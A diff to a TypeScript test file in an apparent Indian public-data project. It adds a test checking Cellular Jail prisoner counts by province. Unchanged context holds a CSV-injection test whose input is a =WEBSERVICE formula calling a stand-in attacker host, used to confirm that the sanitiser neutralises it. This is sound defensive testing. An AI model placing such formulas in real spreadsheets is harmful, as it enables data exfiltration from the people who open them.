@@ -9,6 +9,7 @@ import { jurisdictions } from "../lib/evidence";
 import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
 import { healthBedsByJurisdiction } from "../lib/health-beds";
 import { ambulancesByJurisdiction } from "../lib/ambulances";
+import { cellularJailProvinceRecords, cellularJailTotal } from "../lib/freedom-records";
 
 test("neutralizes spreadsheet formulas and hostile download names",()=>{
   assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
@@ -54,6 +55,15 @@ test("all-state periodic packs cover exactly the jurisdiction model and preserve
   assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.advancedLifeSupport,0),3_044);
   assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.basicLifeSupport,0),15_283);
   assert.ok(Object.values(ambulancesByJurisdiction).every(item=>item.totalOperational===item.advancedLifeSupport+item.basicLifeSupport+item.patientTransport+item.boats+item.bikes+item.otherVehicles));
+});
+
+test("Cellular Jail province table preserves the complete published parliamentary total",()=>{
+  assert.equal(cellularJailProvinceRecords.length,9);
+  assert.equal(new Set(cellularJailProvinceRecords.map(item=>item.province)).size,cellularJailProvinceRecords.length);
+  assert.equal(cellularJailProvinceRecords.reduce((sum,item)=>sum+item.count,0),585);
+  assert.equal(cellularJailTotal,585);
+  assert.equal(cellularJailProvinceRecords.find(item=>item.province==="Bengal")?.count,398);
+  assert.ok(cellularJailProvinceRecords.every(item=>item.count>0));
 });
 
 test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
